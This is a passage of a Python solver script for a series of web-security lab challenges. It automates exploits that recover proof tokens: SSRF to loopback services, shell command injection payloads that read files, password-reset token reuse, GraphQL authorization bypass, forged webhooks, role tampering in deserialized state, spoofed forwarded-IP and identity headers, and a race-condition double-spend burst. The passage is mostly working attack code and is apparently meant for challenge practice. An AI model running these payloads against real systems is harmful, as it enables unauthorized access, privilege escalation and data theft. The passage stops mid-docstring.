    "http://127.0.0.1:8888", "http://[::1]:8080",
]
_SSRF_PARAMS = ("url", "target", "uri", "u", "endpoint", "resource",
                "address", "dest", "location", "link", "fetch", "remote")

def solve_ssrf(url):
    """Day-15 SSRF ('Fetch Quest', ASP.NET Core Minimal API). /api/clues gives
    feature_route (a server-side fetcher: GET ?url=<absolute url>) and
    secondary_route (/account-<hex>, which returns 403 'internal_only' to us
    because it only trusts loopback callers). Point the fetcher at the internal
    service over loopback (http://127.0.0.1:8080<secondary_route>) so the request
    originates internally and passes the guard, returning
    'internal_service_reached' with the proof. Find the recognised url parameter
    (wrong names return 'absolute_url_required'), then sweep host/port."""
    url = url.rstrip("/")
    s = requests.Session(); s.headers.update(UA)
    clues = _clues(url)
    feat = clues.get("feature_route")
    sec = clues.get("secondary_route")
    if not (feat and sec):
        return None
    # identify the recognised url param (and maybe win outright on the first base)
    working = None
    probe = _SSRF_BASES[0] + sec
    for p in _SSRF_PARAMS:
        r = _get(s, url + feat, params={p: probe})
        if r is None:
            continue
        m = PROOF.search(r.text)
        if m:
            return m.group(0)
        if r.status_code != 400 and "absolute_url_required" not in r.text:
            working = p
            break
    if working is None:
        working = "url"
    for base in _SSRF_BASES:
        r = _get(s, url + feat, params={working: base + sec})
        if r is not None:
            m = PROOF.search(r.text)
            if m:
                return m.group(0)
    return None

def solve_cmdinject(url):
    """Day-16 OS command injection ('Shell Company', Gin 'Worker Window').
    /api/clues gives feature_route plus input_parameter (e.g. 'path') and
    example_path (a real path the endpoint runs a diagnostic shell command on,
    e.g. `ls -ld <path>`). The parameter is concatenated into that shell command
    with no sanitisation, so shell metacharacters (`;`, `|`) inject a second
    command. Append a command that reads the objective file; the proof comes back
    in the command's stdout."""
    url = url.rstrip("/")
    s = requests.Session(); s.headers.update(UA)
    clues = _clues(url)
    feat = clues.get("feature_route")
    if not feat:
        return None
    param = clues.get("input_parameter") or "path"
    base = clues.get("example_path") or "/app/static"
    obj = "/run/huntress/objective.txt"
    payloads = [
        "%s; cat %s" % (base, obj),
        "%s | cat %s" % (base, obj),
        "; cat %s" % obj,
        "| cat %s" % obj,
        "%s; cat /run/huntress/*.txt" % base,
        "%s; find /run /app /srv /home /tmp -name 'objective*' -exec cat {} + 2>/dev/null" % base,
        "%s; grep -rhoE 'proof_[0-9a-fA-F]{16,}' /run /app /srv 2>/dev/null" % base,
    ]
    for pl in payloads:
        r = _get(s, url + feat, params={param: pl})
        if r is not None:
            m = PROOF.search(r.text)
            if m:
                return m.group(0)
    return None

def solve_resettoken(url):
    """Day-17 password-reset token not bound to account ('Reset Expectations',
    Symfony). /api/recovery lists request_route, redeem_route, the account and
    token parameter names, and the accounts (one self_service, one privileged
    'self_service:false' holding the proof). A reset token can only be REQUESTED
    for a self-service account, but the redeem route does NOT verify the token
    belongs to the account being redeemed, so the self-service token is accepted
    against the privileged account. Request a token for a self-service account,
    then redeem it against each non-self-service account to recover the proof."""
    url = url.rstrip("/")
    s = requests.Session(); s.headers.update(UA)
    clues = _clues(url)
    guide = clues.get("recovery_guide_route") or "/api/recovery"
    req_route = redeem_route = None
    acct_param, tok_param = "account_id", "token"
    accounts = []
    r = _get(s, url + guide)
    if r is not None:
        try:
            j = r.json()
            req_route = j.get("request_route")
            redeem_route = j.get("redeem_route")
            acct_param = j.get("account_parameter") or acct_param
            tok_param = j.get("token_parameter") or tok_param
            accounts = j.get("accounts") or []
        except Exception:
            pass
    req_route = req_route or clues.get("feature_route")
    redeem_route = redeem_route or clues.get("secondary_route")
    if not (req_route and redeem_route):
        return None
    self_ids = [a.get("id") for a in accounts if a.get("self_service")]
    priv_ids = [a.get("id") for a in accounts if not a.get("self_service")]
    all_ids = [a.get("id") for a in accounts]
    # request a reset token from a self-service account (fall back to any id)
    token = None
    for aid in (self_ids or all_ids or [None]):
        rr = _get(s, url + req_route, params={acct_param: aid} if aid is not None else None)
        if rr is None:
            continue
        try:
            token = rr.json().get("token")
        except Exception:
            token = None
        if token:
            break
    if not token:
        return None
    # redeem the self-service token against the privileged accounts first
    for aid in (priv_ids + all_ids):
        if aid is None:
            continue
        rr = _get(s, url + redeem_route, params={acct_param: aid, tok_param: token})
        if rr is not None:
            m = PROOF.search(rr.text)
            if m:
                return m.group(0)
    return None

def solve_graphql(url):
    """Day-18 GraphQL broken field-level authorization ('Resolver Revolt',
    GraphQL.js 'Graph Garden'). /api/clues gives feature_route (the GraphQL
    endpoint) and protected_reference. The case index only exposes references
    (id/title/visibility), but the single-record resolver (e.g. case(id)) returns
    the full record including the private 'note' field for a protected reference,
    without the field-level check the index implies. Query the protected case's
    note directly to recover the proof; introspection covers randomised names."""
    url = url.rstrip("/")
    s = requests.Session(); s.headers.update(UA)
    clues = _clues(url)
    ep = clues.get("feature_route")
    if not ep:
        return None
    ref = clues.get("protected_reference")

    def gql(q):
        r = _post(s, url + ep, json={"query": q})
        return (r.text if r is not None else None)

    # 1) direct: the common shape (case(id){ id title note }); try int and string id
    for lit in ([str(ref), '"%s"' % ref] if ref is not None else []):
        txt = gql("{ case(id: %s) { id title note } }" % lit)
        if txt:
            m = PROOF.search(txt)
            if m:
                return m.group(0)
    # 2) introspect to handle randomised query/field names
    intro = ("{ __schema { types { name kind "
             "fields { name args { name } type { name kind ofType { name kind } } } } } }")
    txt = gql(intro)
    types = []
    try:
        types = (((_j(txt) or {}).get("data") or {}).get("__schema") or {}).get("types") or []
    except Exception:
        types = []
    tmap = {t.get("name"): t for t in types}

    def scalar_fields(type_name):
        t = tmap.get(type_name) or {}
        out = []
        for f in (t.get("fields") or []):
            ft = f.get("type") or {}
            k = ft.get("kind")
            of = ft.get("ofType") or {}
            if k in ("SCALAR", "ENUM") or of.get("kind") in ("SCALAR", "ENUM"):
                out.append(f["name"])
        return out or ["id"]

    qtype = tmap.get("Query") or next(
        (t for t in types if t.get("kind") == "OBJECT" and t.get("fields")
         and not t.get("name", "").startswith("__")), None)
    record_fields, list_fields = [], []
    for f in ((qtype or {}).get("fields") or []):
        args = [a["name"] for a in (f.get("args") or [])]
        ft = f.get("type") or {}
        ret = (ft.get("ofType") or ft).get("name")
        if any(a in ("id", "reference", "ref", "caseId") for a in args):
            record_fields.append((f["name"], args, ret))
        elif not args:
            list_fields.append((f["name"], ret))
    cand_ids = [ref] if ref is not None else []
    for lf, ret in list_fields:
        sel = " ".join(scalar_fields(ret))
        rows_txt = gql("{ %s { %s } }" % (lf, sel))
        try:
            rows = (((_j(rows_txt) or {}).get("data") or {}).get(lf)) or []
            for row in rows:
                if isinstance(row, dict) and row.get("id") is not None:
                    cand_ids.append(row.get("id"))
        except Exception:
            pass
    seen = set()
    for (rf, args, ret) in (record_fields or [("case", ["id"], "Case")]):
        sel = " ".join(scalar_fields(ret)) if ret else "id title note"
        idarg = next((a for a in args if a in ("id", "reference", "ref", "caseId")), "id")
        for cid in cand_ids:
            if cid is None:
                continue
            for lit in (str(cid), '"%s"' % cid):
                key = (rf, lit)
                if key in seen:
                    continue
                seen.add(key)
                txt = gql("{ %s(%s: %s) { %s } }" % (rf, idarg, lit, sel))
                if txt:
                    m = PROOF.search(txt)
                    if m:
                        return m.group(0)
    return None

def solve_webhook(url):
    """Day-19 forged-webhook trust ('Trust the Webhook', Starlette). The feature
    route is a webhook receiver with NO signature verification ('the app believes
    every event it's told about'); it only requires a well-formed event body. A
    bare {event_type, owner_scope} body is rejected ('webhook_rejected') because
    the server wants a complete, convincing event record, but it never checks who
    sent it. /api/clues gives the event_type and owner_scope values to forge (both
    randomised per variant) and the current_role. Post a superset flat event body
    carrying those values across every plausible field name; the server consumes
    the forged event ('forged_event_consumed') and returns the proof."""
    url = url.rstrip("/")
    s = requests.Session(); s.headers.update(UA)
    clues = _clues(url)
    feat = clues.get("feature_route")
    etype = clues.get("event_type")
    scope = clues.get("owner_scope")
    if not (feat and etype and scope):
        return None
    role = clues.get("current_role") or "analyst"
    action = etype.split(".")[-1] if "." in etype else etype
    now = int(time.time())
    body = {
        "id": "evt_1", "event_id": "evt_1", "delivery_id": "d1",
        "event_type": etype, "type": etype, "event": etype, "name": etype,
        "action": action,
        "owner_scope": scope, "scope": scope, "new_scope": scope,
        "owner": scope, "access": scope,
        "case_id": "1", "case": "1", "id_case": "1",
        "subject": role, "user": role, "username": role, "target": role,
        "actor": "system", "source": "internal", "timestamp": now, "ts": now,
    }
    r = _post(s, url + feat, json=body)
    if r is not None:
        m = PROOF.search(r.text)
        if m:
            return m.group(0)
    return None

# privileged role values an insecure-deserialization state blob might trust
_DESER_ROLES = ["administrator", "admin", "executive", "superuser", "super_admin",
                "superadmin", "sysadmin", "root", "owner", "manager", "supervisor",
                "staff", "operator", "privileged"]
_DESER_ROLE_KEYS = ("role", "roles", "user_role", "account_type", "type", "level",
                    "clearance", "scope", "access", "group", "privilege", "rank")

def solve_deserialize(url):
    """Day-20 insecure deserialization ('Serialized Offender' / 'Object Post',
    Quarkus). The session is a client-supplied 'state' blob (base64url of UTF-8
    JSON) posted to the feature route as {state: <blob>}; the server deserializes
    it and TRUSTS the role inside it ('reshape the bytes, sign nothing'). /api/
    state-format gives the request field name, the encoding and a sample_state
    (e.g. {user:analyst, role:analyst}). Re-encode the sample with the role
    escalated to a privileged value; the server returns 'serialized_role_trusted'
    with the proof. The privileged role name is randomised per variant, so sweep a
    superset of common values."""
    import base64, json as _json
    url = url.rstrip("/")
    s = requests.Session(); s.headers.update(UA)
    clues = _clues(url)
    fmt_route = clues.get("state_format_route") or "/api/state-format"
    feat = clues.get("feature_route")
    field = "state"
    sample = {"user": "analyst", "role": "analyst"}
    r = _get(s, url + fmt_route)
    if r is not None:
        try:
            j = r.json()
            field = j.get("request_field") or field
            if isinstance(j.get("sample_state"), dict):
                sample = j["sample_state"]
            tr = j.get("transport") or ""
            if not feat and " " in tr:
                feat = tr.rsplit(" ", 1)[1]
        except Exception:
            pass
    if not feat:
        return None

    def enc(obj):
        raw = _json.dumps(obj, separators=(",", ":")).encode()
        return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()

    def submit(obj):
        resp = _post(s, url + feat, json={field: enc(obj)})
        if resp is not None:
            m = PROOF.search(resp.text)
            if m:
                return m.group(0)
        return None

    # escalate each role-ish key in the sample to each privileged candidate
    role_keys = [k for k in sample if k.lower() in _DESER_ROLE_KEYS]
    if not role_keys:
        role_keys = [k for k, v in sample.items() if isinstance(v, str)]
    for rk in role_keys:
        for pr in _DESER_ROLES:
            obj = dict(sample); obj[rk] = pr
            pf = submit(obj)
            if pf:
                return pf
    # fallback: over-post admin boolean flags alongside the sample
    obj = dict(sample)
    obj.update({"is_admin": True, "admin": True, "is_administrator": True,
                "administrator": True})
    return submit(obj)

# ---- day-23 trusted reverse-proxy forwarded-header spoof ---------------------
_FWD_HEADERS = ("X-Forwarded-For", "X-Real-IP", "X-Client-IP", "True-Client-IP",
                "X-Originating-IP", "X-Forwarded", "Forwarded-For", "Client-IP",
                "X-Forwarded-Host", "Forwarded")
_FWD_IPS = ("127.0.0.1", "::1", "127.0.0.1, <homebase-ip>", "localhost")
# Privileged role values for the day-30 two-layer variant (forwarded IP trust +
# forwarded role claim). The privileged role is 'administrator' (the homepage
# notes "administrative actions should remain outside this role"), but the policy
# label may say staff_only, so sweep a superset.
_FWD_ROLES = ("administrator", "admin", "staff", "root", "superuser", "owner",
              "operator", "manager", "executive", "sysadmin", "superadmin")

def solve_forwarded(url):
    """Day-23 trusted reverse-proxy header spoof ('Forwarded Misgivings',
    Micronaut) AND the day-30 'Framework Roulette' two-layer variant.

    Base (day-23): the feature route restricts a privileged effect to loopback
    callers but derives the client IP from a forwarded header it blindly trusts
    (clue 'deployment: trusted_reverse_proxy'). A plain GET is 403 loopback_only
    with evaluated_client = our real edge IP; X-Forwarded-For: 127.0.0.1 makes the
    app evaluate the client as loopback -> proxy_trust_admin_bypass with the proof.
    Sweep forwarded-header names x loopback values (leftmost XFF is honoured).

    Two-layer (day-30, 'no familiar names'): the feature route first trusts the
    forwarded client IP (XFF: 127.0.0.1 passes 'gateway_context_rejected') and then
    ALSO trusts a forwarded ROLE CLAIM in a header whose NAME is randomised per
    instance (e.g. x-arena-<hex>) but DISCLOSED by the response's Vary header.
    Setting XFF=127.0.0.1 + <Vary-named header>: administrator yields the proof.
    So after the IP sweep, if the request now reports a second ('topology'/'staff')
    gate, read the Vary header for the role-claim header name and sweep role values."""
    url = url.rstrip("/")
    clues = _clues(url)
    feat = clues.get("feature_route")
    if not feat:
        return None
    s = requests.Session(); s.headers.update(UA)
    for ip in _FWD_IPS:
        for hname in _FWD_HEADERS:
            val = ("for=%s" % ip) if hname == "Forwarded" else ip
            r = _get(s, url + feat, headers={hname: val})
            if r is not None:
                m = PROOF.search(r.text)
                if m:
                    return m.group(0)
    # Two-layer role-claim step: with the IP gate passed, the role-claim header name
    # is leaked in the Vary header. Try each non-standard Vary token (plus generic
    # fallbacks) with privileged role values.
    r = _get(s, url + feat, headers={"X-Forwarded-For": "127.0.0.1"})
    if r is None:
        return None
    vary = r.headers.get("Vary", "")
    cand = [h.strip() for h in vary.split(",")
            if h.strip() and h.strip().lower() not in
            ("accept-encoding", "accept", "cookie", "origin", "user-agent",
             "accept-language", "content-type")]
    cand += ["X-Role", "X-Forwarded-Role", "X-Gateway-Role", "X-Topology-Role",
             "X-Claim-Role"]
    seen = set()
    for hname in cand:
        if hname.lower() in seen:
            continue
        seen.add(hname.lower())
        for role in _FWD_ROLES:
            rr = _get(s, url + feat,
                      headers={"X-Forwarded-For": "127.0.0.1", hname: role})
            if rr is not None:
                m = PROOF.search(rr.text)
                if m:
                    return m.group(0)
    return None

# ---- day-22 unauthorized websocket event stream -----------------------------
_WS_PARAMS = ("stream", "channel", "id", "ref", "topic", "room", "stream_reference",
              "subscribe", "sub")

def solve_websocket(url):
    """Day-22 unauthorized event-stream subscription ('Socket to Me', Koa). The
    feature route is a WebSocket endpoint (GET -> 426 websocket_upgrade_required)
    that refuses a bare upgrade (403) but accepts ?stream=<stream_reference> and
    then immediately pushes the privileged stream frame with NO authorization check
    ('unauthorized_event_stream'). /api/clues gives the stream_reference id. Open
    the socket with that id in the query (param name randomised; sweep candidates)
    and read the first frames for the proof; fall back to sending a subscribe
    message. Requires the websocket-client library."""
    import json as _json
    try:
        import websocket  # websocket-client
    except Exception:
        return None
    url = url.rstrip("/")
    clues = _clues(url)
    feat = clues.get("feature_route")
    stream = clues.get("stream_reference")
    if not feat:
        return None
    host = url.split("://", 1)[-1]
    wsbase = "wss://" + host + feat
    cands = []
    if stream is not None:
        for p in _WS_PARAMS:
            cands.append("%s?%s=%s" % (wsbase, p, stream))
    cands.append(wsbase)
    hdr = ["User-Agent: %s" % UA["User-Agent"], "Origin: https://" + host]
    for wu in cands:
        try:
            ws = websocket.create_connection(wu, timeout=12, header=hdr)
        except Exception:
            continue
        try:
            ws.settimeout(6)
            for _ in range(6):
                try:
                    fr = ws.recv()
                except Exception:
                    break
                if not fr:
                    continue
                txt = fr if isinstance(fr, str) else fr.decode("utf-8", "ignore")
                m = PROOF.search(txt)
                if m:
                    return m.group(0)
            if stream is not None:
                for msg in ({"action": "subscribe", "stream": stream},
                            {"subscribe": stream}, {"type": "subscribe", "id": stream}):
                    try:
                        ws.send(_json.dumps(msg))
                        fr = ws.recv()
                    except Exception:
                        break
                    txt = fr if isinstance(fr, str) else fr.decode("utf-8", "ignore")
                    m = PROOF.search(txt)
                    if m:
                        return m.group(0)
        finally:
            try:
                ws.close()
            except Exception:
                pass
    return None

# ---- day-21 double-spend / TOCTOU race ---------------------------------------
def solve_doublespend(url):
    """Day-21 double-spend / TOCTOU race ('Double Spent', Rails). The feature route
    spends a one-shot credit (POST; GET -> 405 post_required) with a non-atomic
    check-then-decrement; the secondary 'audit' route reveals the proof only once
    credits go negative ('credit_overspent'). A fresh target holds a single credit,
    so two concurrent POSTs both pass the credits>0 check and both decrement ->
    credits:-1 (overspent). Fire a barrier-synchronized burst of spends, then read
    the audit route for the proof.

    NOTE: the credit is one-shot per target instance. The burst must be the FIRST
    writes against a fresh target -- a prior single/blind POST spends the credit
    legitimately (credits 1->0) and leaves nothing to overspend, after which the
    instance is stuck until it is reprovisioned fresh (untimed targets reset after
    ~30 min idle; each timed/mastery run gets a fresh instance). Because detect()
    routes day-21 here on first contact, webrun's first POSTs ARE the burst."""
    import threading
    url = url.rstrip("/")
    clues = _clues(url)
    feat = clues.get("feature_route")
    sec = clues.get("secondary_route")
    if not feat or not sec:
        return None
    probe = requests.Session(); probe.headers.update(UA)
    # already overspent (e.g. re-run on an already-won target)?
    r = _get(probe, url + sec)
    if r is not None:
        m = PROOF.search(r.text)
        if m:
            return m.group(0)
    M = 25

    def fire(barrier):
        ss = requests.Session(); ss.headers.update(UA)
        try:
            ss.get(url + "/", timeout=8)          # pre-warm TLS + connection pool
        except Exception:
            pass
        try:
            barrier.wait(timeout=20)              # align all threads to fire together
        except Exception:
            pass
        try:
            ss.post(url + feat, json={}, timeout=20)
        except Exception:
            pass

    for _ in range(5):
        barrier = threading.Barrier(M)
        ts = [threading.Thread(target=fire, args=(barrier,)) for _ in range(M)]
        for t in ts:
            t.start()
        for t in ts:
            t.join()
        r = _get(probe, url + sec)
        if r is not None:
            m = PROOF.search(r.text)
            if m:
                return m.group(0)
    return None

def solve_failopen(url):
    """Day-24 fail-open authorization ('Fail Open Friday', ASP.NET Core Razor
    Pages). The feature route decides access from a 'remote policy' value shaped
    as <prefix><base64url JSON decision>, where the exact prefix (a remote token)
    is published at policy_format_route. The secure behaviour is to DENY when the
    policy service / decision is unavailable, but a decode exception is caught and
    the code fails OPEN, granting the effect ('exceptional_condition_fail_open').
    Supplying the correct prefix (so the remote token validates) followed by an
    undecodable payload (or the prefix alone) throws during decode and returns the
    proof. A forged decision with the right prefix is still evaluated and denied
    (policy_denied), and a wrong/empty prefix is rejected up front
    (remote_policy_required) -- so the exploit is the exception path, not a forged
    allow."""
    url = url.rstrip("/")
    s = requests.Session(); s.headers.update(UA)
    clues = _clues(url)
    feat = clues.get("feature_route")
    fmt_route = clues.get("policy_format_route") or "/api/policy-format"
    if not feat:
        return None
    param = "policy"
    prefix = ""
    r = _get(s, url + fmt_route)
    if r is not None:
        try:
            j = r.json()
            param = j.get("query_parameter") or param
            prefix = j.get("prefix") or prefix
        except Exception:
            pass
    # Values that make the decision undecodable AFTER the prefix/token validates,
    # driving the caught-exception fail-open path (not a forged decision).
    payloads = [
        prefix + "!!!not-base64!!!",      # invalid base64 -> decode throws
        prefix,                           # no decision payload at all
        prefix + "bm90LWpzb24",           # valid base64url of 'not-json' -> JSON parse throws
        prefix + "eyJ9",                  # truncated/invalid JSON
        prefix + "%%%",
    ]
    for pl in payloads:
        if not pl:
            continue
        rr = _get(s, url + feat, params={param: pl})
        if rr is not None:
            m = PROOF.search(rr.text)
            if m:
                return m.group(0)
    return None

def solve_logaudit(url):
    """Day-25 log/audit discrepancy ('If a Breach Falls in a Log', Slim). The
    feature route performs a privileged 'protected_export' (POST; GET -> 405
    post_required) and returns its export_id -- the export IS written to the log,
    but the public audit feed on the secondary 'status' route masks it as an
    innocuous page_view (the breach 'falls in a log' and no one hears it). The
    status route also accepts a POST 'audit comparison' whose fields (published in
    its 'report') are export_id / missing_event / observed_event: reporting that a
    protected_export is the decisive event MISSING from the feed (observed as
    page_view) surfaces the hidden breach and returns the proof. The export_id must
    be a real logged export, so perform one first."""
    url = url.rstrip("/")
    s = requests.Session(); s.headers.update(UA)
    clues = _clues(url)
    feat = clues.get("feature_route")   # /process (protected_export)
    sec = clues.get("secondary_route")  # /status  (audit feed + comparison)
    if not feat or not sec:
        return None
    # Read the audit-comparison schema and the masked (observed) event label.
    fields = ["export_id", "missing_event", "observed_event"]
    observed = "page_view"
    r = _get(s, url + sec)
    if r is not None:
        try:
            j = r.json()
            rep = j.get("report") or {}
            if isinstance(rep.get("fields"), list) and rep["fields"]:
                fields = rep["fields"]
            evs = j.get("events") or []
            if evs and evs[0].get("event"):
                observed = evs[0]["event"]
        except Exception:
            pass
    # Perform the privileged (breach) operation to get a genuinely-logged id.
    pr = _post(s, url + feat, json={})
    eid = None
    op = "protected_export"
    if pr is not None:
        try:
            jj = pr.json()
            eid = jj.get("export_id")
            op = jj.get("operation") or op
        except Exception:
            pass
    if not eid:
        return None
    # Find how our export is actually shown in the public feed (its masked label).
    r2 = _get(s, url + sec)
    if r2 is not None:
        try:
            for e in r2.json().get("events", []):
                if e.get("export_id") == eid:
                    observed = e.get("event") or observed
                    break
        except Exception:
            pass

    def build(missing, obs):
        b = {}
        for f in fields:
            fl = f.lower()
            if "export" in fl or fl == "id":
                b[f] = eid
            elif "missing" in fl:
                b[f] = missing
            elif "observed" in fl or "logged" in fl or "actual" in fl or "shown" in fl:
                b[f] = obs
            else:
                b[f] = eid
        return b

    for missing in (op, "protected_export", "security_event", "breach"):
        for obs in (observed, "page_view"):
            resp = _post(s, url + sec, json=build(missing, obs))
            if resp is not None:
                m = PROOF.search(resp.text)
                if m:
                    return m.group(0)
    return None

def solve_trustbuild(url):
    """Day-26 Trust the Build (Fiber/Go). Supply-chain / signed-manifest integrity
    bypass. /api/clues gives feature_route (POST an update manifest to activate it;
    GET -> 405 post_required), update_feed (/api/updates: the current signed manifest
    {package, version, artifact:{build, hook}, artifact_sha256, signature}) and
    update_policy (/api/update-policy: lists hooks with an 'access' level -- 'routine'
    vs 'restricted' -- and an integrity_contract claiming activation verifies the
    artifact bytes against the signed SHA-256). The flaw: activation does NOT
    re-verify the artifact bytes against artifact_sha256, so flipping artifact.hook
    from the routine hook to the restricted one while KEEPING the original (valid)
    signature + sha256 still activates -> 'unverified_update_activated' + proof."""
    import copy
    url = url.rstrip("/")
    s = requests.Session(); s.headers.update(UA)
    clues = _clues(url)
    feat = clues.get("feature_route")
    feed = clues.get("update_feed")
    policy = clues.get("update_policy")
    if not (feat and feed):
        return None
    rf = _get(s, url + feed)
    updates = _j(rf.text).get("updates") if rf is not None else None
    if not updates:
        return None
    # Restricted hook name(s) from the policy (anything whose access != routine).
    restricted = []
    if policy:
        rp = _get(s, url + policy)
        for h in (_j(rp.text).get("hooks") if rp is not None else []) or []:
            if (h.get("access") or "").lower() != "routine" and h.get("name"):
                restricted.append(h["name"])
    for extra in ("privileged_export", "privileged", "restricted", "admin_export"):
        if extra not in restricted:
            restricted.append(extra)
    for upd in updates:
        for hook in restricted:
            body = copy.deepcopy(upd)
            if isinstance(body.get("artifact"), dict):
                body["artifact"]["hook"] = hook      # keep artifact_sha256 + signature
            else:
                body["hook"] = hook
            rr = _post(s, url + feat, json=body)
            if rr is not None:
                m = PROOF.search(rr.text)
                if m:
                    return m.group(0)
    return None

def solve_internalaffairs(url):
    """Day-27 Internal Affairs (Ktor). SSRF-then-object-authorization. /api/clues
    gives feature_route (a server-side case fetcher: GET ?target=<loopback http url>,
    which rejects non-loopback with 'loopback_http_target_required'),
    case_directory_route (/api/cases: case ids + owners, incl. a foreign
    'executive'-owned case we don't own) and topology_route (/api/topology: names the
    internal case service base, e.g. http://127.0.0.1:8080/status-<hex>, reachable
    only over loopback). The internal service returns a case by ?id= with NO
    object-level authorization, so SSRF the fetcher at <case_service>?id=<foreign case
    id> to read the executive case -> 'ssrf_then_object_authorization' + proof."""
    url = url.rstrip("/")
    s = requests.Session(); s.headers.update(UA)
    clues = _clues(url)
    feat = clues.get("feature_route")
    cases_route = clues.get("case_directory_route")
    topo_route = clues.get("topology_route")
    if not (feat and topo_route):
        return None
    role = clues.get("current_role") or "analyst"
    # Discover the fetcher's query-parameter name (GET with none -> 400
    # {"query_parameter": "..."}).
    param = "target"
    r0 = _get(s, url + feat)
    if r0 is not None:
        param = _j(r0.text).get("query_parameter") or param
    # Internal case service base (loopback) from the topology route.
    svcs = []
    rt = _get(s, url + topo_route)
    if rt is not None:
        svc = _j(rt.text).get("case_service")
        if svc:
            svcs.append(svc)
    for base in ("http://127.0.0.1:8080", "http://localhost:8080", "http://127.0.0.1"):
        if base not in svcs:
            svcs.append(base)
    # Candidate case ids: foreign-owned first, then everything.
    ids = []
    if cases_route:
        rc = _get(s, url + cases_route)
        cases = (_j(rc.text).get("cases") if rc is not None else []) or []
        foreign = [c.get("id") for c in cases if c.get("owner") and c.get("owner") != role]
        rest = [c.get("id") for c in cases if c.get("id") not in foreign]
        ids = [i for i in foreign + rest if i is not None]
    for svc in svcs:
        for cid in (ids or [None]):
            if cid is None:
                cands = [svc]
            else:
                sep = "&" if "?" in svc else "?"
                cands = [svc + sep + "id=" + str(cid),
                         svc + sep + "case=" + str(cid),
                         svc + sep + "case_id=" + str(cid),
                         svc.rstrip("/") + "/" + str(cid)]
            for t in cands:
                rr = _get(s, url + feat, params={param: t})
                if rr is not None:
                    m = PROOF.search(rr.text)
                    if m:
                        return m.group(0)
    return None

# ---- day-28 delegated-identity passthrough trust -----------------------------
_DELEG_HEADERS = ("X-Delegated-User", "X-Delegated-Identity", "X-Delegated-Caller",
                  "X-On-Behalf-Of", "X-Identity", "X-Forwarded-User", "X-Remote-User",
                  "X-User", "X-Caller", "X-Actor", "X-Impersonate", "X-Run-As",
                  "X-Delegate", "X-Trusted-Identity", "X-Service-Identity",
                  "X-Auth-Request-User", "X-Forwarded-Identity", "X-Delegated")

def solve_delegidentity(url):
    """Day-28 delegated-identity passthrough trust ('Pass the Identity', Axum).
    /api/clues gives feature_route, secondary_route and identity_directory_route
    (/api/identities: {caller: <us>, records_owner: <privileged>}). The feature
    route is a delegated service boundary that blindly trusts a forwarded identity
    header: a bare request is 403 'delegated_identity_rejected', but presenting a
    delegated-identity header (X-Delegated-User here; randomised per variant) whose
    value is the privileged records_owner makes the server act as that identity ->
    'delegated_identity_trusted' with the proof. Read the privileged identity from
    the directory, then sweep candidate header names (and both feature/secondary
    routes) with that value. The privileged identity (records_owner) and the known
    header are tried first, so the win is normally the first request."""
    url = url.rstrip("/")
    s = requests.Session(); s.headers.update(UA)
    clues = _clues(url)
    feat = clues.get("feature_route")
    idr = clues.get("identity_directory_route") or "/api/identities"
    if not feat:
        return None
    # Discover the privileged identity to impersonate: any directory value that is
    # not our own caller (records_owner), privileged-looking values first.
    identities = []
    r = _get(s, url + idr)
    if r is not None:
        j = _j(r.text)
        caller = j.get("caller")
        for k, v in j.items():
            if k == "caller" or not isinstance(v, str):
                continue
            if v and v != caller:
                identities.append(v)
    for extra in ("executive", "admin", "administrator", "owner", "root", "superuser"):
        if extra not in identities:
            identities.append(extra)
    routes = [rt for rt in (feat, clues.get("secondary_route")) if rt]
    for ident in identities:
        for h in _DELEG_HEADERS:
            for route in routes:
                rr = _get(s, url + route, headers={h: ident})
                if rr is not None:
                    m = PROOF.search(rr.text)
                    if m:
                        return m.group(0)
    return None

# ---- day-29 queue owner-binding bypass ---------------------------------------
def solve_queuebind(url):
    """Day-29 queue owner-binding bypass ('Queue the Confusion', Pyramid). /api/
    clues gives feature_route (POST a job; GET -> 405 post_required with
    request_fields ['owner']), secondary_route (read a job result by ?id=) and
    owner_directory_route (/api/owners: {caller: <us>, restricted_owner:
    <privileged>}). A job is queued with whatever 'owner' the client supplies, with
    NO check that the caller may act as that owner, so POSTing owner=<restricted_
    owner> queues a job bound to the privileged owner; reading that job id back
    returns 'queue_owner_binding_bypassed' with the proof. Read the restricted owner
    from the directory, discover the owner field + id query-param names, POST the
    job, then read the result by its id."""
    url = url.rstrip("/")
    s = requests.Session(); s.headers.update(UA)
    clues = _clues(url)
    feat = clues.get("feature_route")
    sec = clues.get("secondary_route")
    odr = clues.get("owner_directory_route") or "/api/owners"
    if not (feat and sec):
        return None
    # Privileged owner to impersonate: a directory value that is not our caller.
    owners = []
    r = _get(s, url + odr)
    if r is not None:
        j = _j(r.text)
        caller = j.get("caller")
        for k, v in j.items():
            if k == "caller" or not isinstance(v, str):
                continue
            if v and v != caller:
                owners.append(v)
    for extra in ("executive", "admin", "administrator", "owner", "root"):
        if extra not in owners:
            owners.append(extra)
    # The owner field name (request_fields on the 405) and the id query-param name
    # (query_parameter on the secondary route's 400) are both published.
    field = "owner"
    rg = _get(s, url + feat)
    if rg is not None:
        rf = _j(rg.text).get("request_fields")
        if isinstance(rf, list) and rf:
            field = rf[0]
    idparam = "id"
    rs = _get(s, url + sec)
    if rs is not None:
        qp = _j(rs.text).get("query_parameter")
        if qp:
            idparam = qp
    for owner in owners:
        pr = _post(s, url + feat, json={field: owner})
        if pr is None:
            continue
        m0 = PROOF.search(pr.text)          # proof could appear in the POST response
        if m0:
            return m0.group(0)
        jid = _j(pr.text).get("id")
        if jid is None:
            continue
        rr = _get(s, url + sec, params={idparam: jid})
        if rr is not None:
            m = PROOF.search(rr.text)
            if m:
                return m.group(0)
    return None

# ---- day-31 full-stack incident chain -----------------------------------------
def solve_fullstack(url):
    """Day-31 'Full Stack Incident' (Actix). A multi-stage chain, NOT a single bug:
    reconstruct the unsigned fetch->worker incident from the request log, reproduce
    it over the exposed service routes, inspect the resulting evidence, then POST a
    detector + repair analysis that blocks the attack while keeping the benign
    signed status check. /api/clues names every route and field:
      feature_route (signed_fetch_required), secondary_route (event_not_verified),
      final_route (worker; worker_preconditions_missing), evidence_route,
      response_route, request_log_route, and the field names fetch_query_field
      ('target'), event_json_field ('token'), worker_query_field ('command').
    Steps:
      1. GET request_log_route -> find the queued, unsigned internal fetch target
         (record signed=false / outcome=queued): a hex id.
      2. GET feature_route?<fetch_query_field>=<target>  -> fetch_event_created.
      3. POST secondary_route {<event_json_field>: <target>} -> worker_dispatched
         (returns available_commands like ['status','cat <resource>'] + resources).
      4. GET final_route?<worker_query_field>=status (benign, signed) and
         =cat <resource> (the unsigned worker dispatch that executes).
      5. GET evidence_route -> incident reproduced; returns response_schema +
         regression_goal.
